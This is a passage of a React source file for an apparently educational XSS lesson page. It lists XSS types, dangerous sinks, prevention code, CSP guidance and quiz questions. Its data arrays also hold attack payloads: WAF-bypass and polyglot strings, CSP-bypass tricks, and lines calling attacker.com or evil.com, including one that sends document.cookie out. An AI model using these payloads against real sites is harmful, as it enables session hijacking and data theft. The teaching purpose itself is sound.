import React, { useState, useEffect } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Container,
  Typography,
  Paper,
  Chip,
  Button,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  alpha,
  useTheme,
  Fab,
  Drawer,
  IconButton,
  Divider,
  LinearProgress,
  Tooltip,
  useMediaQuery,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import CodeIcon from "@mui/icons-material/Code";
import WarningIcon from "@mui/icons-material/Warning";
import WebIcon from "@mui/icons-material/Web";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import SearchIcon from "@mui/icons-material/Search";
import ShieldIcon from "@mui/icons-material/Shield";
import QuizIcon from "@mui/icons-material/Quiz";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import SchoolIcon from "@mui/icons-material/School";
import CategoryIcon from "@mui/icons-material/Category";
import BuildIcon from "@mui/icons-material/Build";
import HistoryIcon from "@mui/icons-material/History";
import TerminalIcon from "@mui/icons-material/Terminal";
import { Link, useNavigate } from "react-router-dom";

interface XSSType {
  title: string;
  description: string;
  persistence: string;
  color: string;
}

const CodeBlock: React.FC<{ code: string; language?: string }> = ({
  code,
  language = "javascript",
}) => {
  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: "#0f1422",
        borderRadius: 2,
        border: "1px solid rgba(245, 158, 11, 0.2)",
      }}
    >
      <Box sx={{ display: "flex", justifyContent: "flex-end", mb: 1 }}>
        <Chip label={language} size="small" sx={{ bgcolor: alpha("#f59e0b", 0.2), color: "#f59e0b" }} />
      </Box>
      <Box
        component="pre"
        sx={{
          m: 0,
          overflow: "auto",
          fontFamily: "monospace",
          fontSize: "0.85rem",
          color: "grey.200",
          lineHeight: 1.6,
        }}
      >
        {code}
      </Box>
    </Paper>
  );
};

const xssTypes: XSSType[] = [
  {
    title: "Reflected XSS",
    description: "Payload in URL or request data is echoed into the response without encoding; often requires a victim to click a crafted link.",
    persistence: "Non-persistent",
    color: "#f59e0b",
  },
  {
    title: "Stored XSS",
    description: "Payload is saved in a database or cache and rendered to other users later; high impact because it spreads widely.",
    persistence: "Persistent",
    color: "#ef4444",
  },
  {
    title: "DOM-Based XSS",
    description: "Payload moves from a DOM source to a dangerous sink in client-side JS; the server might never see it.",
    persistence: "Client-side",
    color: "#8b5cf6",
  },
];

const xssFlow = [
  "Attacker identifies an input that influences a page or client-side template.",
  "Untrusted data crosses a trust boundary (URL, form, API, or stored data).",
  "The app inserts the data into HTML, attributes, or scripts without context-aware encoding.",
  "The browser interprets the input as markup or code instead of data.",
  "The script runs with the site's origin (cookies, DOM, storage, and APIs).",
  "The attacker reads sensitive data or performs actions as the victim.",
  "If content is stored or shared, the impact can scale to many users.",
];

const entryPoints = [
  "Search, filter, and sort parameters in URLs or query strings",
  "Comment fields, profile bios, chat messages, and support tickets",
  "Markdown or rich text editors that allow HTML",
  "File names, metadata, and image captions rendered in the UI",
  "JSON values rendered into templates or client-side state",
  "Single-page app routes using URL fragments or client-side routing",
  "Error pages, validation messages, and inline previews",
  "Third-party widgets or integrations that echo user data",
];

const highRiskFeatures = [
  "User-generated content feeds and activity streams",
  "Admin dashboards with custom queries, filters, or notes",
  "Preview pages or content moderation queues",
  "Notifications and email template previews",
  "Analytics dashboards with custom filters and saved views",
  "Import/export flows that render uploaded content",
  "Multi-tenant portals where content is shared widely",
];

const domSources = [
  "location.search, location.hash, location.pathname, document.URL",
  "document.cookie (if not HttpOnly)",
  "localStorage, sessionStorage, and indexedDB",
  "postMessage event data and window.name",
  "document.referrer or history.state",
  "Injected JSON blobs and data-* attributes",
];

const safeDomPractices = [
  "Prefer textContent or innerText over innerHTML",
  "Use createElement + appendChild for DOM building",
  "Sanitize HTML with DOMPurify before insertion",
  "Validate URL schemes before setting href or src",
  "Avoid eval, new Function, and dynamic script creation",
  "Adopt Trusted Types to harden DOM sinks",
  "Keep template rendering in frameworks that auto-escape",
];

const commonPayloads = [
  { payload: "<script>alert(1)</script>", context: "Basic test" },
  { payload: "<img src=x onerror=alert(1)>", context: "Event handler" },
  { payload: "<svg onload=alert(1)>", context: "SVG element" },
  { payload: "javascript:alert(1)", context: "URL scheme" },
  { payload: "'-alert(1)-'", context: "Attribute breakout" },
  { payload: "</script><script>alert(1)</script>", context: "Tag escape" },
  { payload: "\"><img src=x onerror=alert(1)>", context: "Quote escape" },
  { payload: "<a href=javascript:alert(1)>link</a>", context: "Link injection" },
];

const impactScenarios = [
  "Session hijacking (steal cookies or tokens)",
  "Silent actions as the user (payments, password changes)",
  "Keylogging or form data interception",
  "Phishing via page modification and fake login prompts",
  "Data exfiltration from the DOM or APIs",
  "Malware distribution or crypto mining in the browser",
  "Privilege escalation when admins view infected content",
];

const preventionMethods = [
  "Context-aware output encoding (HTML, JS, URL, CSS)",
  "Prefer safe DOM APIs over string-based HTML creation",
  "Content Security Policy (CSP) with nonces or hashes",
  "Trusted Types enforcement for high-risk sinks",
  "Input validation with allowlists for rich text",
  "Frameworks with auto-escaping (React, Angular, Vue)",
  "Sanitize HTML with DOMPurify or similar",
  "HttpOnly, Secure, and SameSite cookie flags",
];

const dangerousSinks = [
  "innerHTML, outerHTML",
  "insertAdjacentHTML",
  "document.write()",
  "eval(), setTimeout(), setInterval()",
  "new Function()",
  "location.href, location.assign()",
  "setAttribute with untrusted href or src",
  "setAttribute for on* event handlers",
  "jQuery .html(), .append(), .before()",
];

const encodingContexts = [
  { context: "HTML body", risk: "Injected tags become real elements", safe: "Use HTML encoding or textContent" },
  { context: "HTML attribute", risk: "Quote breaking or event handler injection", safe: "Attribute encoding + allowlists" },
  { context: "URL", risk: "javascript: or data: schemes", safe: "Validate scheme with URL API" },
  { context: "JavaScript string", risk: "Break out of quotes", safe: "Avoid inline JS, use data attributes" },
  { context: "CSS", risk: "url() or expression injection", safe: "Avoid dynamic CSS or allowlist values" },
  { context: "JSON in HTML", risk: "Script breakouts in templates", safe: "Use JSON.stringify and escape safely" },
];

const detectionSignals = [
  "Unexpected HTML tags rendered in user content",
  "CSP reports blocking inline scripts or eval",
  "WAF alerts for script or event handler patterns",
  "DOM changes after input is rendered or updated",
  "Audit logs showing odd query strings or markup",
  "User reports of popups, redirects, or page tampering",
];

const testingChecklist = [
  "Map all input fields and where they render",
  "Identify the output context (HTML, attribute, URL, JS, CSS)",
  "Verify if output is encoded or sanitized",
  "Inspect the DOM in dev tools, not only the response",
  "Review client-side code for unsafe sinks",
  "Confirm CSP behavior in Report-Only mode",
  "Use safe, non-destructive payloads for verification",
  "Document the data flow and validate fixes end-to-end",
];

const cspGuidelines = [
  "Start with default-src 'self' and add sources slowly",
  "Use nonces or hashes for scripts instead of unsafe-inline",
  "Avoid unsafe-eval unless absolutely required",
  "Set object-src 'none' and base-uri 'none'",
  "Limit frame-ancestors to prevent clickjacking",
  "Enable Report-Only before enforcing blocking",
  "Monitor CSP reports for drift and regressions",
];

const responseSteps = [
  "Fix output encoding in the vulnerable context",
  "Remove or refactor unsafe DOM sinks",
  "Add a CSP policy and validate coverage",
  "Rotate sessions if exposure is suspected",
  "Add regression tests for the vulnerable view",
  "Review logs to estimate exposure and affected users",
  "Notify stakeholders and document remediation steps",
];

const frameworkNotes = [
  "React escapes by default; avoid dangerouslySetInnerHTML without sanitization.",
  "Angular sanitizes templates; avoid bypassSecurityTrust unless required.",
  "Vue escapes by default; v-html requires sanitization.",
  "Template engines with auto-escape can be bypassed with unsafe flags.",
  "Server-side rendering can amplify impact if output is unsafe.",
];

// Advanced XSS Techniques
const advancedTechniques = [
  {
    name: "Mutation XSS (mXSS)",
    description: "Exploits browser HTML parsing quirks where sanitized HTML mutates into executable code when re-parsed",
    example: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    difficulty: "Advanced",
  },
  {
    name: "Polyglot Payloads",
    description: "Single payload that works across multiple contexts (HTML, JS, URL, CSS)",
    example: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A",
    difficulty: "Advanced",
  },
  {
    name: "Blind XSS",
    description: "XSS that triggers in a different context than where it's injected (e.g., admin panels)",
    example: "Payload with external callback: <script src=//attacker.com/hook.js>",
    difficulty: "Intermediate",
  },
  {
    name: "DOM Clobbering",
    description: "Using HTML elements with id/name attributes to overwrite DOM properties",
    example: "<img name=x><img id=y name=x><script>alert(x.y)</script>",
    difficulty: "Advanced",
  },
  {
    name: "Prototype Pollution to XSS",
    description: "Exploiting prototype pollution to inject XSS via gadgets in JavaScript libraries",
    example: "Polluting Object.prototype with innerHTML gadgets",
    difficulty: "Expert",
  },
  {
    name: "SVG-based XSS",
    description: "Using SVG elements which support scripting and event handlers",
    example: "<svg><animate onbegin=alert(1) attributeName=x>",
    difficulty: "Intermediate",
  },
];

// WAF Bypass Techniques
const wafBypassTechniques = [
  { technique: "Case Variation", example: "<ScRiPt>alert(1)</sCrIpT>", description: "Mix upper and lowercase" },
  { technique: "HTML Encoding", example: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", description: "Use HTML entities" },
  { technique: "Double Encoding", example: "%253Cscript%253E", description: "URL encode twice" },
  { technique: "Unicode Escapes", example: "<script>\\u0061lert(1)</script>", description: "JS unicode escapes" },
  { technique: "Null Bytes", example: "<scr%00ipt>alert(1)</script>", description: "Insert null bytes" },
  { technique: "Tag Variations", example: "<svg/onload=alert(1)>", description: "Use alternative tags" },
  { technique: "Event Handler Variations", example: "<body onpageshow=alert(1)>", description: "Less common events" },
  { technique: "Protocol Handlers", example: "<a href=javascript:alert(1)>", description: "javascript: URL scheme" },
  { technique: "Template Literals", example: "<script>alert`1`</script>", description: "Tagged template literals" },
  { technique: "Comment Injection", example: "<script>/**/alert(1)/**/</script>", description: "Use comments" },
];

// Real-world XSS case studies
const realWorldCases = [
  {
    name: "Samy Worm (2005)",
    platform: "MySpace",
    type: "Stored XSS",
    impact: "Over 1 million users infected in 20 hours",
    description: "Self-propagating XSS worm that added 'Samy is my hero' to profiles and spread via friend connections.",
  },
  {
    name: "Twitter StalkDaily (2009)",
    platform: "Twitter",
    type: "Stored XSS",
    impact: "Hundreds of thousands of tweets posted",
    description: "Worm that automatically tweeted links and followed accounts when users viewed infected profiles.",
  },
  {
    name: "eBay XSS (2015)",
    platform: "eBay",
    type: "Stored XSS",
    impact: "Credential theft, session hijacking",
    description: "Attackers injected malicious scripts into product listings to steal buyer credentials.",
  },
  {
    name: "British Airways (2018)",
    platform: "BA Website",
    type: "Stored XSS via Magecart",
    impact: "380,000 payment cards stolen",
    description: "Malicious script injected to skim payment card data during checkout.",
  },
  {
    name: "Apache JIRA XSS (2019)",
    platform: "Atlassian JIRA",
    type: "Stored XSS",
    impact: "CVE-2019-8451, account takeover",
    description: "XSS in JIRA issue descriptions allowed attackers to steal admin sessions.",
  },
];

// Testing tools
const xssTestingTools = [
  { name: "Burp Suite", category: "Proxy", description: "Industry-standard web security testing tool with XSS scanner" },
  { name: "OWASP ZAP", category: "Proxy", description: "Free, open-source web app scanner with active XSS detection" },
  { name: "XSStrike", category: "Scanner", description: "Advanced XSS detection with fuzzing and WAF bypass" },
  { name: "Dalfox", category: "Scanner", description: "Fast parameter analysis and XSS scanning tool" },
  { name: "XSS Hunter", category: "Callback", description: "Blind XSS detection with screenshot capture" },
  { name: "BeEF", category: "Framework", description: "Browser Exploitation Framework for post-XSS attacks" },
  { name: "DOM Invader", category: "Browser", description: "Burp extension for DOM XSS testing" },
  { name: "Polyglot Generator", category: "Payload", description: "Generate context-agnostic XSS payloads" },
];

// CSP bypass techniques
const cspBypassTechniques = [
  {
    scenario: "Dangling Markup",
    description: "When CSP blocks inline scripts but allows forms, inject markup to exfiltrate data",
    example: "<form action=https://attacker.com><input name=data value='",
  },
  {
    scenario: "JSONP Endpoints",
    description: "If CSP allows a domain with JSONP, use callback parameter for script execution",
    example: "<script src='https://allowed.com/jsonp?callback=alert'></script>",
  },
  {
    scenario: "Angular Expression Injection",
    description: "If Angular is allowed, template expressions can bypass script-src restrictions",
    example: "{{constructor.constructor('alert(1)')()}}",
  },
  {
    scenario: "Base Tag Injection",
    description: "Inject base tag to redirect relative script sources to attacker domain",
    example: "<base href='https://attacker.com/'>",
  },
  {
    scenario: "Script Gadgets",
    description: "Use existing script functionality in allowed libraries to achieve code execution",
    example: "Using jQuery's $.globalEval() or similar gadgets",
  },
  {
    scenario: "Object-src Bypass",
    description: "If object-src is permissive, use plugins like Flash or PDF for script execution",
    example: "<object data='malicious.swf'></object>",
  },
];

// Browser-specific behaviors
const browserDifferences = [
  {
    browser: "Chrome",
    behavior: "Strict CSP enforcement, removes X-XSS-Protection support",
    notes: "Best CSP reporting, Trusted Types support",
  },
  {
    browser: "Firefox",
    behavior: "Strong CSP support, different HTML parsing quirks",
    notes: "Some mXSS variations work differently",
  },
  {
    browser: "Safari",
    behavior: "Older JavaScript engine, some CSP gaps",
    notes: "May have unique DOM parsing behaviors",
  },
  {
    browser: "Edge (Chromium)",
    behavior: "Same as Chrome for CSP and XSS filtering",
    notes: "Legacy Edge had different behaviors",
  },
];

const codeSamples = [
  {
    title: "Unsafe DOM injection",
    language: "javascript",
    code: `// Bad: user input becomes HTML
const input = location.hash.slice(1);
element.innerHTML = input;`,
  },
  {
    title: "Safe text rendering",
    language: "javascript",
    code: `// Good: user input becomes plain text
const input = location.hash.slice(1);
element.textContent = input;`,
  },
  {
    title: "Safe URL handling",
    language: "javascript",
    code: `const url = new URL(input, window.location.origin);
const allowed = ["http:", "https:"];
link.href = allowed.includes(url.protocol) ? url.href : "#";`,
  },
  {
    title: "React safe rendering",
    language: "jsx",
    code: `// Safe: React escapes by default
return <div>{comment}</div>;

// Risky: only use with sanitizer
return <div dangerouslySetInnerHTML={{ __html: comment }} />;`,
  },
  {
    title: "Sanitize rich HTML",
    language: "javascript",
    code: `import DOMPurify from "dompurify";
element.innerHTML = DOMPurify.sanitize(html);`,
  },
];

// Extended code samples for more scenarios
const extendedCodeSamples = [
  {
    title: "Vue.js Safe vs Unsafe",
    language: "vue",
    code: `<!-- Safe: v-text or mustache syntax -->
<div v-text="userInput"></div>
<div>{{ userInput }}</div>

<!-- Unsafe: v-html with untrusted input -->
<div v-html="userInput"></div>

<!-- Safe: v-html with sanitization -->
<div v-html="sanitize(userInput)"></div>`,
  },
  {
    title: "Angular Safe Patterns",
    language: "typescript",
    code: `// Safe: Angular auto-escapes interpolation
<div>{{ userInput }}</div>

// Unsafe: bypassing sanitization
constructor(private sanitizer: DomSanitizer) {}
// Only use bypassSecurityTrust with known-safe values
html = this.sanitizer.bypassSecurityTrustHtml(untrusted);

// Safe: use sanitizer properly
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
safeHtml: SafeHtml = this.sanitizer.sanitize(
  SecurityContext.HTML, userInput
) || '';`,
  },
  {
    title: "Express.js Output Encoding",
    language: "javascript",
    code: `const express = require('express');
const helmet = require('helmet');
const xss = require('xss');

const app = express();

// Set security headers including CSP
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
    },
  },
}));

// Sanitize user input before storing
app.post('/comment', (req, res) => {
  const safeComment = xss(req.body.comment);
  // Store safeComment in database
});`,
  },
  {
    title: "CSP Header Configuration",
    language: "http",
    code: `# Strict CSP with nonces (recommended)
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data: https:;
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
  report-uri /csp-report;

# Report-Only mode for testing
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri /csp-report;`,
  },
  {
    title: "DOMPurify Advanced Configuration",
    language: "javascript",
    code: `import DOMPurify from 'dompurify';

// Basic sanitization
const clean = DOMPurify.sanitize(dirty);

// Allow only specific tags
const restrictive = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href', 'title'],
});

// Block dangerous URI schemes
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.hasAttribute('href')) {
    const href = node.getAttribute('href');
    if (!href.startsWith('https://')) {
      node.removeAttribute('href');
    }
  }
});

// Sanitize for use in specific context
const forAttribute = DOMPurify.sanitize(input, {
  ALLOWED_TAGS: [],
  KEEP_CONTENT: true,
});`,
  },
  {
    title: "Trusted Types Implementation",
    language: "javascript",
    code: `// Enable Trusted Types via CSP header:
// Content-Security-Policy: require-trusted-types-for 'script'

// Create a policy for HTML sanitization
if (window.trustedTypes) {
  const policy = trustedTypes.createPolicy('default', {
    createHTML: (input) => DOMPurify.sanitize(input),
    createScriptURL: (input) => {
      const url = new URL(input, location.origin);
      if (url.origin === location.origin) {
        return input;
      }
      throw new Error('Untrusted script URL');
    },
  });

  // Now innerHTML requires TrustedHTML
  element.innerHTML = policy.createHTML(userInput);
}`,
  },
  {
    title: "PostMessage Security",
    language: "javascript",
    code: `// Unsafe: accepting messages from any origin
window.addEventListener('message', (e) => {
  document.body.innerHTML = e.data; // XSS!
});

// Safe: validate origin and sanitize data
window.addEventListener('message', (e) => {
  // Whitelist allowed origins
  const allowedOrigins = ['https://trusted.com'];
  if (!allowedOrigins.includes(e.origin)) {
    console.warn('Message from untrusted origin:', e.origin);
    return;
  }

  // Validate message structure
  if (typeof e.data !== 'object' || !e.data.type) {
    return;
  }

  // Handle specific message types safely
  if (e.data.type === 'updateText') {
    element.textContent = String(e.data.text);
  }
});`,
  },
  {
    title: "jQuery Safe Patterns",
    language: "javascript",
    code: `// Unsafe: creates elements from user input
$('<div>' + userInput + '</div>').appendTo('body'); // XSS!
$('#element').html(userInput); // XSS!

// Safe: use text() for untrusted content
$('#element').text(userInput);

// Safe: create elements properly
$('<div>').text(userInput).appendTo('body');

// Safe: set attributes safely
$('<a>')
  .attr('href', validateUrl(userInput))
  .text(userInput)
  .appendTo('body');

// If HTML is needed, sanitize first
$('#element').html(DOMPurify.sanitize(userInput));`,
  },
];

// Exploit scenarios for different contexts
const exploitScenarios = [
  {
    context: "URL Parameter Reflection",
    vulnerable: "https://site.com/search?q=<script>alert(1)</script>",
    payload: "<script>alert(document.cookie)</script>",
    impact: "Session hijacking via reflected XSS",
  },
  {
    context: "JSON Response Injection",
    vulnerable: "Response: {\"name\": \"<user_input>\"}",
    payload: "\"></script><script>alert(1)</script>",
    impact: "Script execution when JSON rendered in HTML",
  },
  {
    context: "SVG File Upload",
    vulnerable: "Allow SVG uploads rendered in browser",
    payload: "<svg onload=alert(1)>",
    impact: "Stored XSS via uploaded images",
  },
  {
    context: "Markdown Renderer",
    vulnerable: "Markdown with raw HTML enabled",
    payload: "[Click](javascript:alert(1))",
    impact: "XSS via markdown link injection",
  },
  {
    context: "Error Page Reflection",
    vulnerable: "Error: 'user_input' not found",
    payload: "'/><script>alert(1)</script>",
    impact: "XSS in error messages",
  },
  {
    context: "PDF Generator",
    vulnerable: "HTML to PDF with user content",
    payload: "<script>document.location='https://evil.com/?c='+document.cookie</script>",
    impact: "Server-side XSS / data exfiltration",
  },
];

const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = "#ef4444";
const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Fundamentals",
    question: "XSS stands for:",
    options: ["Cross-Site Scripting", "Cross-Site Security", "Cross-Session Scripting", "Cross-Server Syncing"],
    correctAnswer: 0,
    explanation: "XSS is short for Cross-Site Scripting.",
  },
  {
    id: 2,
    topic: "Fundamentals",
    question: "XSS allows attackers to:",
    options: ["Run script in a victim's browser", "Bypass TLS", "Escalate OS kernel privileges", "Disable firewalls"],
    correctAnswer: 0,
    explanation: "XSS executes attacker-controlled script in the victim context.",
  },
  {
    id: 3,
    topic: "Types",
    question: "Reflected XSS occurs when:",
    options: ["Input is reflected in a response and executed", "Payload is stored on the server", "Only the DOM is affected", "No user interaction is required"],
    correctAnswer: 0,
    explanation: "Reflected XSS is immediate and request/response based.",
  },
  {
    id: 4,
    topic: "Types",
    question: "Stored XSS occurs when:",
    options: ["Payload is persisted and served to users later", "The payload only lives in the URL", "Only the browser cache is used", "The payload is blocked by default"],
    correctAnswer: 0,
    explanation: "Stored XSS is persisted in a database or storage.",
  },
  {
    id: 5,
    topic: "Types",
    question: "DOM-based XSS occurs when:",
    options: ["Client-side code writes unsafe data into the DOM", "The server stores the payload", "Only a WAF is bypassed", "A CSP header is missing"],
    correctAnswer: 0,
    explanation: "DOM XSS happens entirely in client-side code.",
  },
  {
    id: 6,
    topic: "Impact",
    question: "A common impact of XSS is:",
    options: ["Session theft and account takeover", "Disk encryption", "Router compromise", "Kernel panic"],
    correctAnswer: 0,
    explanation: "XSS can steal tokens or act as the victim user.",
  },
  {
    id: 7,
    topic: "Impact",
    question: "XSS can be used to:",
    options: ["Perform actions as the victim", "Bypass TLS certificates", "Disable DNSSEC", "Patch applications"],
    correctAnswer: 0,
    explanation: "Scripts run with the victim's browser privileges.",
  },
  {
    id: 8,
    topic: "Impact",
    question: "Stored XSS is often more severe because:",
    options: ["It can affect many users who view the content", "It never executes", "It requires no permissions", "It only targets admins"],
    correctAnswer: 0,
    explanation: "Stored payloads execute for every viewer.",
  },
  {
    id: 9,
    topic: "Sinks",
    question: "Which is a dangerous sink for untrusted input?",
    options: ["innerHTML", "textContent", "createTextNode", "appendChild with text"],
    correctAnswer: 0,
    explanation: "innerHTML parses and executes HTML.",
  },
  {
    id: 10,
    topic: "Sinks",
    question: "A safer alternative to innerHTML is:",
    options: ["textContent", "document.write", "eval", "outerHTML"],
    correctAnswer: 0,
    explanation: "textContent inserts text without HTML parsing.",
  },
  {
    id: 11,
    topic: "Sinks",
    question: "document.write is dangerous because it:",
    options: ["Parses HTML from untrusted input", "Encrypts output", "Validates input automatically", "Escapes by default"],
    correctAnswer: 0,
    explanation: "document.write injects raw HTML.",
  },
  {
    id: 12,
    topic: "Sinks",
    question: "Using eval on untrusted input can lead to:",
    options: ["XSS or code execution in the browser", "Safer parsing", "Automatic escaping", "Input validation"],
    correctAnswer: 0,
    explanation: "eval executes attacker-controlled code.",
  },
  {
    id: 13,
    topic: "Sinks",
    question: "Which is a common DOM XSS sink?",
    options: ["insertAdjacentHTML", "textContent", "appendChild", "setAttribute with fixed values"],
    correctAnswer: 0,
    explanation: "insertAdjacentHTML parses HTML and scripts.",
  },
  {
    id: 14,
    topic: "Sources",
    question: "Which is a common DOM XSS source?",
    options: ["location.hash", "Math.random()", "Date.now()", "console.log()"],
    correctAnswer: 0,
    explanation: "location.* values are user-controlled.",
  },
  {
    id: 15,
    topic: "Sources",
    question: "Another common DOM XSS source is:",
    options: ["document.URL", "document.title", "navigator.platform", "screen.width"],
    correctAnswer: 0,
    explanation: "document.URL can contain user input.",
  },
  {
    id: 16,
    topic: "Sources",
    question: "document.referrer is risky because it:",
    options: ["May contain attacker-controlled data", "Is always empty", "Is always trusted", "Is encrypted"],
    correctAnswer: 0,
    explanation: "Referrer can be set by external pages.",
  },
  {
    id: 17,
    topic: "Contexts",
    question: "Output encoding must be:",
    options: ["Context-specific", "Always the same", "Skipped for JSON", "Used only on input"],
    correctAnswer: 0,
    explanation: "HTML, JS, URL, and CSS contexts differ.",
  },
  {
    id: 18,
    topic: "Contexts",
    question: "HTML body context should use:",
    options: ["HTML entity encoding", "URL encoding", "Base64 only", "No encoding"],
    correctAnswer: 0,
    explanation: "HTML entity encoding is correct for body text.",
  },
  {
    id: 19,
    topic: "Contexts",
    question: "URL components should use:",
    options: ["encodeURIComponent", "HTML encoding", "No encoding", "Base64 only"],
    correctAnswer: 0,
    explanation: "encodeURIComponent is for URL components.",
  },
  {
    id: 20,
    topic: "Contexts",
    question: "JavaScript string context requires:",
    options: ["Escaping quotes and backslashes", "Only HTML encoding", "Only URL encoding", "No encoding"],
    correctAnswer: 0,
    explanation: "JS strings need JS-specific escaping.",
  },
  {
    id: 21,
    topic: "Contexts",
    question: "Attribute context requires:",
    options: ["Escaping quotes and special characters", "Only URL encoding", "No encoding", "Only base64"],
    correctAnswer: 0,
    explanation: "Attribute values must be properly escaped.",
  },
  {
    id: 22,
    topic: "Mitigation",
    question: "The primary defense against XSS is:",
    options: ["Output encoding/escaping", "Only input validation", "Only WAFs", "Only logging"],
    correctAnswer: 0,
    explanation: "Proper output encoding prevents script execution.",
  },
  {
    id: 23,
    topic: "Mitigation",
    question: "Input validation alone is:",
    options: ["Not sufficient to prevent XSS", "Always sufficient", "The only defense needed", "More important than encoding"],
    correctAnswer: 0,
    explanation: "Validation helps but output encoding is required.",
  },
  {
    id: 24,
    topic: "Mitigation",
    question: "A Content Security Policy (CSP) helps by:",
    options: ["Restricting where scripts can load from", "Encoding output", "Validating input", "Disabling JavaScript"],
    correctAnswer: 0,
    explanation: "CSP limits script sources and execution.",
  },
  {
    id: 25,
    topic: "Mitigation",
    question: "A strong CSP usually avoids:",
    options: ["unsafe-inline", "script-src 'self'", "object-src 'none'", "nonce-based policies"],
    correctAnswer: 0,
    explanation: "unsafe-inline weakens CSP protections.",
  },
  {
    id: 26,
    topic: "Mitigation",
    question: "CSP nonces should be:",
    options: ["Random per response", "Static and reused", "Hard-coded", "Publicly documented"],
    correctAnswer: 0,
    explanation: "Nonces must be unpredictable to be effective.",
  },
  {
    id: 27,
    topic: "Mitigation",
    question: "CSP hash-based policies allow:",
    options: ["Specific inline scripts by hash", "All inline scripts", "All external scripts", "No scripts at all"],
    correctAnswer: 0,
    explanation: "Hashes allow only matching inline scripts.",
  },
  {
    id: 28,
    topic: "Cookies",
    question: "HttpOnly cookies:",
    options: ["Cannot be read by JavaScript", "Prevent all XSS", "Encrypt the cookie", "Disable sessions"],
    correctAnswer: 0,
    explanation: "HttpOnly blocks JS access to cookies.",
  },
  {
    id: 29,
    topic: "Cookies",
    question: "HttpOnly does not prevent XSS because:",
    options: ["Attackers can still act as the user in the browser", "It disables cookies", "It blocks all requests", "It encodes input"],
    correctAnswer: 0,
    explanation: "XSS can still perform actions without reading cookies.",
  },
  {
    id: 30,
    topic: "Headers",
    question: "The X-XSS-Protection header is:",
    options: ["Deprecated and not reliable", "Required in all browsers", "A complete fix", "A replacement for CSP"],
    correctAnswer: 0,
    explanation: "Modern browsers have deprecated this header.",
  },
  {
    id: 31,
    topic: "Headers",
    question: "CSP report-only mode is used to:",
    options: ["Test policies without breaking pages", "Block all scripts", "Enable unsafe-inline", "Disable logging"],
    correctAnswer: 0,
    explanation: "Report-only helps evaluate a CSP safely.",
  },
  {
    id: 32,
    topic: "Frameworks",
    question: "Template engines that auto-escape:",
    options: ["Reduce XSS risk by default", "Eliminate need for encoding", "Make XSS impossible", "Disable JavaScript"],
    correctAnswer: 0,
    explanation: "Auto-escaping helps but context matters.",
  },
  {
    id: 33,
    topic: "Frameworks",
    question: "React's dangerouslySetInnerHTML is risky because it:",
    options: ["Injects raw HTML into the DOM", "Sanitizes automatically", "Escapes by default", "Blocks scripts"],
    correctAnswer: 0,
    explanation: "It bypasses React's built-in escaping.",
  },
  {
    id: 34,
    topic: "Frameworks",
    question: "Using a sanitizer like DOMPurify helps by:",
    options: ["Removing dangerous HTML and attributes", "Encrypting input", "Skipping encoding", "Adding scripts"],
    correctAnswer: 0,
    explanation: "Sanitizers remove risky markup and attributes.",
  },
  {
    id: 35,
    topic: "Frameworks",
    question: "Allowlist-based sanitization is:",
    options: ["Safer than a denylist", "Less safe than a denylist", "Equivalent always", "Not recommended"],
    correctAnswer: 0,
    explanation: "Allowlists reduce unknown dangerous elements.",
  },
  {
    id: 36,
    topic: "Payloads",
    question: "A basic XSS test payload is:",
    options: ["<script>alert(1)</script>", "SELECT * FROM users", "127.0.0.1", "DROP TABLE"],
    correctAnswer: 0,
    explanation: "A simple alert payload is common for testing.",
  },
  {
    id: 37,
    topic: "Payloads",
    question: "Event handler attributes like onclick are:",
    options: ["Common XSS vectors", "Always safe", "Blocked by HTML", "Only for CSS"],
    correctAnswer: 0,
    explanation: "Event handlers execute JavaScript.",
  },
  {
    id: 38,
    topic: "Payloads",
    question: "A javascript: URL can cause:",
    options: ["Script execution when clicked", "TLS errors only", "Safe navigation only", "No effect"],
    correctAnswer: 0,
    explanation: "javascript: URLs execute code in the browser.",
  },
  {
    id: 39,
    topic: "Payloads",
    question: "SVG files can be risky because they:",
    options: ["Can contain script and event handlers", "Are always safe images", "Cannot run scripts", "Are text-only"],
    correctAnswer: 0,
    explanation: "SVG supports scripting and events.",
  },
  {
    id: 40,
    topic: "Payloads",
    question: "Markdown renderers are risky when they:",
    options: ["Allow raw HTML without sanitization", "Only render text", "Escape HTML by default", "Disable links"],
    correctAnswer: 0,
    explanation: "Raw HTML in Markdown can enable XSS.",
  },
  {
    id: 41,
    topic: "Contexts",
    question: "Encoding must happen:",
    options: ["At the point of output", "Only at input", "Only in the database", "Only in the browser"],
    correctAnswer: 0,
    explanation: "Output encoding should be applied when rendering.",
  },
  {
    id: 42,
    topic: "Contexts",
    question: "Double-encoding user input can:",
    options: ["Break rendering and create bypasses", "Always improve safety", "Prevent XSS", "Encrypt data"],
    correctAnswer: 0,
    explanation: "Improper encoding order can cause issues.",
  },
  {
